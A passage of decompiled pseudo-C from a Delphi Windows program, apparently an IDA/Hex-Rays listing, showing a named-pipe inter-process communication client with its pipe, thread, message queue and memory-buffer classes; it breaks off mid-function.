//----- (00454C40) --------------------------------------------------------
int __fastcall sub_454C40(int a1, char a2, char a3, _DWORD *a4, int a5, int a6, int a7, int a8)
{
  char v8; // bl
  int v9; // esi

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v8 = a2;
  *(_BYTE *)(a1 + 28) = a3;
  *(_DWORD *)(a1 + 4) = *a4;
  *(_DWORD *)(a1 + 8) = a4[1];
  *(_DWORD *)(a1 + 12) = a4[2];
  *(_DWORD *)(a1 + 16) = a4[3];
  *(_DWORD *)(a1 + 20) = a4[4];
  v9 = a1;
  *(_DWORD *)(a1 + 32) = a6;
  *(_DWORD *)(a1 + 36) = a7;
  *(_DWORD *)(a1 + 40) = a8;
  System::__linkproc__ IntfCopy(a1 + 24, a5);
  if ( v8 )
    System::__linkproc__ AfterConstruction(v9);
  return v9;
}
// 454C52: variable 'a2' is possibly undefined
// 454C56: variable 'a3' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);

//----- (00454CB0) --------------------------------------------------------
int sub_454CB0()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax
  _DWORD *v4; // [esp+8h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  v4 = (_DWORD *)(v0 + 40);
  LODWORD(v0) = *(_DWORD *)(v0 + 40);
  *v4 = 0;
  sub_405598((_DWORD *)v0);
  System::__linkproc__ IntfClear(v2 + 24);
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40A04C: using guessed type int __fastcall System::__linkproc__ IntfClear(_DWORD);

//----- (00454D00) --------------------------------------------------------
_DWORD *__fastcall sub_454D00(int a1, int a2, int a3)
{
  _DWORD *v4; // eax

  sub_40B058(a1, a2, a3);
  v4 = *(_DWORD **)(a1 + 12);
  *(_DWORD *)(a1 + 12) = 0;
  return sub_405598(v4);
}

//----- (00454D30) --------------------------------------------------------
void __usercall __spoils<edx,ecx> sub_454D30(char a1@<dl>, _DWORD *a2@<ecx>, int a3@<edi>)
{
  int *v3; // eax
  unsigned int v4[2]; // [esp-1Ch] [ebp-2Ch] BYREF
  int *v5; // [esp-14h] [ebp-24h]
  _DWORD *v6; // [esp+4h] [ebp-Ch]
  char v7; // [esp+Bh] [ebp-5h]
  int v8; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  if ( a1 )
    System::__linkproc__ ClassCreate();
  v6 = a2;
  v7 = a1;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_454D95;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  v3 = (int *)sub_405568((int)&cls_CrossPlatform_TMemoryStream, 1);
  *(_DWORD *)(v8 + 12) = v3;
  sub_434F80(v3, (int)v6, 1, a3);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_454D9C;
  sub_405598(v6);
  if ( v7 )
    System::__linkproc__ AfterConstruction(v8);
}
// 454D43: variable 'a2' is possibly undefined
// 454D46: variable 'a1' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 4227A8: using guessed type int (*cls_CrossPlatform_TMemoryStream)();

//----- (00454E00) --------------------------------------------------------
_DWORD *__fastcall sub_454E00(int a1, int a2, int a3)
{
  sub_40B058(a1, a2, a3);
  return sub_454EE0((_DWORD *)(a1 + 12));
}

//----- (00454E20) --------------------------------------------------------
int __fastcall sub_454E20(int a1, char a2, void *a3, int a4)
{
  const void *v4; // edi
  int v5; // ebx
  char v7; // [esp+Fh] [ebp-1h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v4 = a3;
  v7 = a2;
  v5 = a1;
  sub_454EB0((unsigned int *)(a1 + 12), a4);
  if ( a4 > 0 && v4 )
    System::Move(v4, *(void **)(v5 + 12), a4);
  if ( v7 )
    System::__linkproc__ AfterConstruction(v5);
  return v5;
}
// 454E33: variable 'a3' is possibly undefined
// 454E35: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (00454EB0) --------------------------------------------------------
unsigned int __fastcall sub_454EB0(unsigned int *a1, unsigned int a2)
{
  int Mem; // edx
  unsigned int result; // eax

  a1[2] = a2;
  Mem = System::__linkproc__ GetMem(a2 + 15);
  a1[1] = Mem;
  result = (Mem + 15) & 0xFFFFFFF0;
  *a1 = result;
  return result;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);

//----- (00454EE0) --------------------------------------------------------
_DWORD *__fastcall sub_454EE0(_DWORD *a1)
{
  int v2; // eax

  v2 = a1[1];
  if ( v2 )
    System::__linkproc__ FreeMem(v2);
  return sub_454F10(a1);
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00454F10) --------------------------------------------------------
_DWORD *__fastcall sub_454F10(_DWORD *result)
{
  result[1] = 0;
  *result = 0;
  result[2] = 0;
  return result;
}

//----- (00455170) --------------------------------------------------------
int __fastcall sub_455170(int a1, char a2, int a3, int a4)
{
  unsigned int v5[2]; // [esp-1Ch] [ebp-30h] BYREF
  int *v6; // [esp-14h] [ebp-28h]
  int v7; // [esp+4h] [ebp-10h] BYREF
  int v8; // [esp+8h] [ebp-Ch]
  char v9; // [esp+Fh] [ebp-5h]
  int v10; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v7 = 0;
  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v8 = a3;
  v9 = a2;
  v10 = a1;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_455211;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  *(_DWORD *)(a1 + 132) = a3;
  *(_DWORD *)(v10 + 136) = a4;
  sub_454570(v10, 0, 0x8000, *(_DWORD *)(v10 + 132) + 72);
  sub_4544C0(*(_DWORD **)(v8 + 8), &v7);
  sub_406FE8((volatile __int32 *)(v10 + 140), v7);
  *(_DWORD *)(v10 + 108) = -1;
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_455218;
  sub_406C44(&v7);
  if ( v9 )
    System::__linkproc__ AfterConstruction(v10);
  return v10;
}
// 455188: variable 'a3' is possibly undefined
// 45518B: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (00455240) --------------------------------------------------------
Imglist::TCustomImageList *__fastcall sub_455240(Imglist::TCustomImageList *a1)
{
  Imglist::TCustomImageList *result; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-10h] BYREF
  int *v3; // [esp-4h] [ebp-8h]
  Imglist::TCustomImageList *v4; // [esp+0h] [ebp-4h]
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v4 = a1;
  Imglist::TCustomImageList::Initialize(a1);
  result = v4;
  if ( *((_DWORD *)v4 + 27) != -1 )
  {
    sub_4285F0(*(int (__fastcall ****)(_DWORD))(*((_DWORD *)v4 + 33) + 36));
    v3 = &savedregs;
    v2[1] = (unsigned int)&loc_4552B9;
    v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v2);
    *(_BYTE *)(*((_DWORD *)v4 + 33) + 40) = 0;
    CloseHandle_0(*((HANDLE *)v4 + 27));
    *((_DWORD *)v4 + 27) = -1;
    __writefsdword(0, v2[0]);
    v3 = (int *)&loc_4552C0;
    return (Imglist::TCustomImageList *)sub_428600(*(_DWORD *)(*((_DWORD *)v4 + 33) + 36));
  }
  return result;
}

//----- (004552D0) --------------------------------------------------------
int __fastcall sub_4552D0(int a1, void (__fastcall **a2)(_DWORD))
{
  return sub_455A20(*(_DWORD *)(a1 + 132), a2);
}

//----- (00455300) --------------------------------------------------------
int __fastcall sub_455300(int result)
{
  const WCHAR *v1; // eax
  int v2; // eax
  int v3; // edx
  unsigned int ExceptionList; // [esp-8h] [ebp-14h] BYREF
  void *v5; // [esp-4h] [ebp-10h]
  int *v6; // [esp+0h] [ebp-Ch]
  DWORD Mode; // [esp+4h] [ebp-8h] BYREF
  int v8; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v8 = result;
  if ( !*(_BYTE *)(result + 4) )
  {
    result = v8;
    if ( !*(_BYTE *)(v8 + 5) )
    {
      *(_DWORD *)(v8 + 144) = 250;
      v5 = 0;
      ExceptionList = 0x40000000;
      v1 = (const WCHAR *)sub_407790(*(_DWORD *)(v8 + 140));
      *(_DWORD *)(v8 + 108) = CreateFileW_0(v1, 0xC0000000, 0, 0, 3u, 0x40000000u, 0);
      result = v8;
      if ( *(_DWORD *)(v8 + 108) != -1 )
      {
        Mode = 2;
        if ( SetNamedPipeHandleState(*(HANDLE *)(v8 + 108), &Mode, 0, 0) )
        {
          sub_454B80(v8);
          v6 = (int *)sub_428AF0(*(_DWORD **)(v8 + 8));
          sub_454540((int)v6, 0, 20);
          v2 = sub_454E20((int)&cls_InterComUtil_TICMessageAlignMemData, 1, (void *)(*(_DWORD *)(v8 + 132) + 41), 20);
          v3 = v2;
          if ( v2 )
            v3 = v2 + 24;
          System::__linkproc__ IntfCopy(v6 + 6, v3);
          v6[5] = (*(int (__fastcall **)(int, _DWORD))(*(_DWORD *)v6[6] + 12))(v6[6], *(_DWORD *)v6[6]);
          sub_428B50(*(_DWORD **)(v8 + 8), (int)v6);
          sub_454A80(v8);
          sub_454550(v8);
          *(_DWORD *)(v8 + 144) = 60000;
          sub_4285F0(*(int (__fastcall ****)(_DWORD))(*(_DWORD *)(v8 + 132) + 36));
          v6 = &savedregs;
          v5 = &loc_455465;
          ExceptionList = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)&ExceptionList);
          *(_BYTE *)(*(_DWORD *)(v8 + 132) + 40) = 1;
          __writefsdword(0, ExceptionList);
          v6 = (int *)&loc_455473;
          return sub_428600(*(_DWORD *)(*(_DWORD *)(v8 + 132) + 36));
        }
        else
        {
          return (**(int (__fastcall ***)(int))v8)(v8);
        }
      }
    }
  }
  return result;
}
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);
// 4541C8: using guessed type __int16 cls_InterComUtil_TICMessageAlignMemData;

//----- (00455480) --------------------------------------------------------
Classes::TThread *__fastcall sub_455480(int a1, char a2, int a3)
{
  char v4; // [esp+7h] [ebp-5h]
  Classes::TThread *v5; // [esp+8h] [ebp-4h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v4 = a2;
  v5 = (Classes::TThread *)a1;
  *(_DWORD *)(a1 + 40) = a3;
  *(_DWORD *)(a1 + 44) = sub_455170((int)cls_InterComClientUtil_TICClientPipe, 1, *(_DWORD *)(a1 + 40), a1);
  sub_43DC30(v5, 0, 0, 2000);
  if ( v4 )
    System::__linkproc__ AfterConstruction(v5);
  return v5;
}
// 455495: variable 'a2' is possibly undefined
// 4554A1: variable 'a3' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 454F9C: using guessed type int (*cls_InterComClientUtil_TICClientPipe[2])();

//----- (004554F0) --------------------------------------------------------
int __usercall sub_4554F0@<eax>(int a1@<edi>)
{
  __int64 v1; // rax
  int result; // eax
  char v3; // [esp+3h] [ebp-5h]
  int v4; // [esp+4h] [ebp-4h]

  v1 = System::__linkproc__ BeforeDestruction();
  v3 = BYTE4(v1);
  v4 = v1;
  sub_43DCB0(a1);
  result = unknown_libname_94(v4 + 44);
  if ( v3 > 0 )
    return System::__linkproc__ ClassDestroy(v4);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);

//----- (00455530) --------------------------------------------------------
_DWORD *__fastcall sub_455530(int *a1)
{
  unsigned int v2[3]; // [esp-24h] [ebp-40h] BYREF
  unsigned int v3[2]; // [esp-18h] [ebp-34h] BYREF
  int *v4; // [esp-10h] [ebp-2Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v6; // [esp-8h] [ebp-24h]
  int *v7; // [esp-4h] [ebp-20h]
  void *v8; // [esp+0h] [ebp-1Ch]
  int v9; // [esp+4h] [ebp-18h]
  int v10; // [esp+8h] [ebp-14h]
  const WCHAR *v11[2]; // [esp+Ch] [ebp-10h] BYREF
  DWORD v12; // [esp+14h] [ebp-8h]
  int *v13; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v11[0] = 0;
  v13 = a1;
  v7 = &savedregs;
  v6 = &loc_455655;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_405514(*a1, (int)v11);
  sub_427100(v11[0]);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_455638;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_4555F3;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  while ( !*((_BYTE *)v13 + 13) )
  {
    if ( *(_DWORD *)(v13[11] + 108) == -1 )
      sub_455300(v13[11]);
    v12 = WaitForSingleObjectEx(*(HANDLE *)(v13[8] + 4), *(_DWORD *)(v13[11] + 144), -1);
    if ( *((_BYTE *)v13 + 13) )
    {
      (**(void (__fastcall ***)(int))v13[11])(v13[11]);
      break;
    }
    if ( !v12 )
      sub_455910(v13[10]);
  }
  __writefsdword(0, v2[0]);
  __writefsdword(0, v3[0]);
  (*(void (__fastcall **)(int *, int, int *, const WCHAR *, const WCHAR *, int, int, void *, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *, void *))(*v13 + 4))(
    v13,
    *v13,
    v4,
    v11[1],
    v11[0],
    v10,
    v9,
    v8,
    v7,
    v6,
    ExceptionList,
    &loc_45563F);
  __writefsdword(0, (unsigned int)v6);
  v8 = &loc_45565C;
  return sub_406C44(v11);
}

//----- (00455690) --------------------------------------------------------
int __fastcall sub_455690(int a1, int a2)
{
  return sub_454730(a2, a1);
}
// 454730: using guessed type int __cdecl sub_454730(_DWORD, _DWORD);

//----- (004556B0) --------------------------------------------------------
int __fastcall sub_4556B0(int a1, char a2, int a3, _DWORD *a4, int a5, int a6, int a7)
{
  _DWORD *v7; // edi
  int v8; // eax
  int v9; // eax
  Classes::TThread *v10; // eax
  unsigned int v12[2]; // [esp-1Ch] [ebp-30h] BYREF
  int *v13; // [esp-14h] [ebp-28h]
  int v14; // [esp+8h] [ebp-Ch]
  char v15; // [esp+Fh] [ebp-5h]
  int v16; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v14 = a3;
  v15 = a2;
  v16 = a1;
  sub_405568(a1, 0);
  sub_406FE8((volatile __int32 *)(v16 + 8), v14);
  v7 = (_DWORD *)(v16 + 41);
  *(_DWORD *)(v16 + 41) = *a4;
  *++v7 = a4[1];
  *++v7 = a4[2];
  *++v7 = a4[3];
  v7[1] = a4[4];
  if ( a7 )
  {
    *(_DWORD *)(v16 + 36) = a7;
  }
  else
  {
    *(_BYTE *)(v16 + 4) = 1;
    *(_DWORD *)(v16 + 36) = sub_428540((int)cls_CrossPlatform_TCriticalSection, 1);
  }
  *(_DWORD *)(v16 + 12) = sub_428A10((int)&cls_CrossPlatform_TFIFOContainer, 1, (int)&cls_CrossPlatform_TFIFOItem, 1000);
  *(_DWORD *)(v16 + 64) = sub_428A10((int)&cls_CrossPlatform_TFIFOContainer, 1, (int)&cls_CrossPlatform_TFIFOItem, 1000);
  v8 = v16;
  *(_DWORD *)(v16 + 16) = a6;
  *(_DWORD *)(v8 + 20) = a5;
  sub_454BB0(v16 + 72);
  v9 = v16;
  *(_DWORD *)(v16 + 1100) = v16;
  *(_DWORD *)(v9 + 1096) = sub_455B80;
  sub_4285F0(*(int (__fastcall ****)(_DWORD))(v16 + 36));
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_4557CE;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v10 = sub_455480((int)cls_InterComClientUtil_TICClientThread, 1, v16);
  *(_DWORD *)(v16 + 32) = v10;
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_4557D5;
  sub_428600(*(_DWORD *)(v16 + 36));
  if ( v15 )
    System::__linkproc__ AfterConstruction(v16);
  return v16;
}
// 4556C4: variable 'a3' is possibly undefined
// 4556C7: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 4231F0: using guessed type int (*cls_CrossPlatform_TCriticalSection[3])();
// 423438: using guessed type _DWORD (__fastcall *cls_CrossPlatform_TFIFOItem)(Ibservices::TLicenseMaskInfo *__hidden this);
// 4234D4: using guessed type __int16 cls_CrossPlatform_TFIFOContainer;
// 45505C: using guessed type int (*cls_InterComClientUtil_TICClientThread[2])();

//----- (00455800) --------------------------------------------------------
int sub_455800()
{
  __int64 v0; // rax
  int result; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v3; // [esp-4h] [ebp-Ch]
  char v4; // [esp+3h] [ebp-5h]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v0 = System::__linkproc__ BeforeDestruction();
  v4 = BYTE4(v0);
  v5 = v0;
  if ( *(_DWORD *)(v0 + 32) )
  {
    sub_4285F0(*(int (__fastcall ****)(_DWORD))(v5 + 36));
    v3 = &savedregs;
    v2[1] = (unsigned int)&loc_45585F;
    v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v2);
    Classes::TThread::Terminate(*(Classes::TThread **)(v5 + 32));
    sub_4558F0(v5);
    __writefsdword(0, v2[0]);
    v3 = (int *)&loc_455866;
    sub_428600(*(_DWORD *)(v5 + 36));
    sub_405598(*(_DWORD **)(v5 + 32));
    *(_DWORD *)(v5 + 32) = 0;
  }
  if ( *(_BYTE *)(v5 + 4) )
    unknown_libname_94(v5 + 36);
  else
    *(_DWORD *)(v5 + 36) = 0;
  sub_428B70(*(_DWORD **)(v5 + 64));
  unknown_libname_94(v5 + 64);
  sub_428B70(*(_DWORD **)(v5 + 12));
  unknown_libname_94(v5 + 12);
  result = sub_405588();
  if ( v4 > 0 )
    return System::__linkproc__ ClassDestroy(v5);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);

//----- (004558F0) --------------------------------------------------------
BOOL __fastcall sub_4558F0(int a1)
{
  return sub_43DD60(*(_DWORD *)(a1 + 32));
}

//----- (00455910) --------------------------------------------------------
int __fastcall sub_455910(int a1)
{
  unsigned int v2[2]; // [esp-18h] [ebp-20h] BYREF
  int *v3; // [esp-10h] [ebp-18h]
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  _DWORD *v6; // [esp+0h] [ebp-8h]
  int v7; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v7 = a1;
  sub_4285F0(*(int (__fastcall ****)(_DWORD))(a1 + 36));
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_4559B4;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_43DD70(*(_DWORD *)(v7 + 32));
  while ( 1 )
  {
    v6 = (_DWORD *)sub_428BA0(*(_DWORD **)(v7 + 64));
    if ( !v6 )
      break;
    v3 = &savedregs;
    v2[1] = (unsigned int)&loc_455994;
    v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v2);
    sub_454BF0(v7 + 72, v6[8]);
    sub_455690(*(_DWORD *)(v7 + 32), (int)v6);
    __writefsdword(0, v2[0]);
    v3 = (int *)&loc_45593D;
    sub_405598(v6);
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_4559BB;
  return sub_428600(*(_DWORD *)(v7 + 36));
}

//----- (004559C0) --------------------------------------------------------
char __fastcall sub_4559C0(int a1)
{
  unsigned int v2[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v3; // [esp-4h] [ebp-Ch]
  char v4; // [esp+3h] [ebp-5h]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  sub_4285F0(*(int (__fastcall ****)(_DWORD))(a1 + 36));
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_455A04;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  v4 = *(_BYTE *)(v5 + 40);
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_455A0B;
  sub_428600(*(_DWORD *)(v5 + 36));
  return v4;
}

//----- (00455A20) --------------------------------------------------------
int __fastcall sub_455A20(int a1, void (__fastcall **a2)(_DWORD))
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v4; // [esp-8h] [ebp-14h]
  int *v5; // [esp-4h] [ebp-10h]
  void (__fastcall **v6)(_DWORD); // [esp+4h] [ebp-8h]
  int v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = a2;
  v7 = a1;
  sub_4285F0(*(int (__fastcall ****)(_DWORD))(a1 + 36));
  v5 = &savedregs;
  v4 = &loc_455A8E;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( *(_WORD *)(v7 + 18)
    && (*(unsigned __int8 (__fastcall **)(_DWORD, void (__fastcall **)(_DWORD)))(v7 + 16))(*(_DWORD *)(v7 + 20), v6) )
  {
    return System::__linkproc__ TryFinallyExit(ExceptionList, v4, v5);
  }
  sub_428BE0(*(_DWORD **)(v7 + 12), v6);
  __writefsdword(0, (unsigned int)ExceptionList);
  v5 = (int *)&loc_455A95;
  return sub_428600(*(_DWORD *)(v7 + 36));
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);

//----- (00455AA0) --------------------------------------------------------
char __fastcall sub_455AA0(int a1, _DWORD *a2)
{
  struct _EXCEPTION_REGISTRATION_RECORD *v3; // [esp-18h] [ebp-24h] BYREF
  void *v4; // [esp-14h] [ebp-20h]
  void **v5; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v7; // [esp-8h] [ebp-14h]
  void **v8; // [esp-4h] [ebp-10h]
  char v9; // [esp+3h] [ebp-9h]
  _DWORD *v10; // [esp+4h] [ebp-8h]
  int v11; // [esp+8h] [ebp-4h]
  void *savedregs; // [esp+Ch] [ebp+0h] BYREF

  v10 = a2;
  v11 = a1;
  v9 = 0;
  sub_4285F0(*(int (__fastcall ****)(_DWORD))(a1 + 36));
  v8 = &savedregs;
  v7 = &loc_455B65;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v5 = &savedregs;
  v4 = &loc_455B45;
  v3 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v3);
  if ( *(_BYTE *)(v11 + 40) )
  {
    if ( sub_454C00(v11 + 72, (int)v10) )
    {
      System::__linkproc__ TryFinallyExit(v3, v4, v5);
      System::__linkproc__ TryFinallyExit(ExceptionList, v7, v8);
      return v9;
    }
    v9 = 1;
    sub_428BE0(*(_DWORD **)(v11 + 64), (void (__fastcall **)(_DWORD))v10);
    sub_454BA0(v11 + 72, v10[8]);
    sub_4558F0(v11);
  }
  __writefsdword(0, (unsigned int)v3);
  v5 = (void **)&loc_455B4C;
  if ( !v9 )
    sub_405598(v10);
  __writefsdword(0, (unsigned int)v10);
  savedregs = &loc_455B6C;
  sub_428600(*(_DWORD *)(v11 + 36));
  return v9;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);

//----- (00455B80) --------------------------------------------------------
int __fastcall sub_455B80(int a1, int a2)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5 = a2;
  v6 = a1;
  sub_4285F0(*(int (__fastcall ****)(_DWORD))(a1 + 36));
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_455BD5;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  if ( *(_WORD *)(v6 + 26) )
    (*(void (__fastcall **)(_DWORD, int))(v6 + 24))(*(_DWORD *)(v6 + 28), v5);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_455BDC;
  return sub_428600(*(_DWORD *)(v6 + 36));
}

//----- (00455EA0) --------------------------------------------------------
int __usercall sub_455EA0@<eax>(int *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>, int a5@<esi>)
{
  int v5; // edx
  int v6; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v9; // [esp-8h] [ebp-20h]
  int *v10; // [esp-4h] [ebp-1Ch]
  void *v11; // [esp+0h] [ebp-18h]
  int v12[5]; // [esp+4h] [ebp-14h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v12[0] = 0;
  v12[1] = a3;
  v12[2] = a2;
  v12[4] = (int)a1;
  v10 = &savedregs;
  v9 = &loc_455EFA;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_405514(*a1, (int)v12);
  LOBYTE(v5) = 1;
  v6 = unknown_libname_85(cls_CrossPlatform_EStreamError, v5, v12[0]);
  sub_406340(v6, 0, (int)&savedregs, a4, a5);
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_455F01;
  sub_406C44(v12);
  return v12[3];
}
// 455EDA: variable 'v5' is possibly undefined
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 422B6C: using guessed type int (*cls_CrossPlatform_EStreamError[2])();

//----- (00455F70) --------------------------------------------------------
_BYTE *__fastcall sub_455F70(int a1)
{
  nullsub_2(a1);
  *(_DWORD *)(a1 + 4) = sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
  return sub_429060(*(_BYTE **)(a1 + 4), 1);
}
// 405840: using guessed type int __fastcall nullsub_2(_DWORD);
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();

//----- (00455FB0) --------------------------------------------------------
int __fastcall sub_455FB0(int a1)
{
  sub_4246F0((int *)(a1 + 4));
  return nullsub_3(a1);
}
// 405844: using guessed type int __fastcall nullsub_3(_DWORD);

//----- (00455FD0) --------------------------------------------------------
char __userpurge sub_455FD0@<al>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>, int a5, int a6)
{
  int v6; // eax
  volatile __int32 *v7; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // [esp-20h] [ebp-4Ch] BYREF
  void *v10; // [esp-1Ch] [ebp-48h]
  int *v11; // [esp-18h] [ebp-44h]
  struct _EXCEPTION_REGISTRATION_RECORD *v12; // [esp-14h] [ebp-40h] BYREF
  void *v13; // [esp-10h] [ebp-3Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-38h] BYREF
  void *v15; // [esp-8h] [ebp-34h]
  int *v16; // [esp-4h] [ebp-30h]
  void *v17; // [esp+0h] [ebp-2Ch]
  int v18; // [esp+4h] [ebp-28h] BYREF
  int v19; // [esp+8h] [ebp-24h] BYREF
  unsigned __int8 (__fastcall ***v20)(_DWORD, _DWORD **, int); // [esp+Ch] [ebp-20h]
  _DWORD *v21; // [esp+10h] [ebp-1Ch] BYREF
  int v22; // [esp+14h] [ebp-18h] BYREF
  Classes::TStream *v23; // [esp+18h] [ebp-14h]
  char v24; // [esp+1Fh] [ebp-Dh]
  int v25; // [esp+20h] [ebp-Ch]
  int v26; // [esp+24h] [ebp-8h]
  int v27; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v18 = 0;
  v19 = 0;
  v22 = 0;
  v25 = a3;
  v26 = a2;
  v27 = a1;
  v16 = &savedregs;
  v15 = &loc_456185;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v24 = 0;
  v6 = (*(int (__fastcall **)(_DWORD))(**(_DWORD **)(a2 + 24) + 16))(*(_DWORD *)(a2 + 24));
  (*(void (__stdcall **)(int))(**(_DWORD **)(v26 + 24) + 12))(v6);
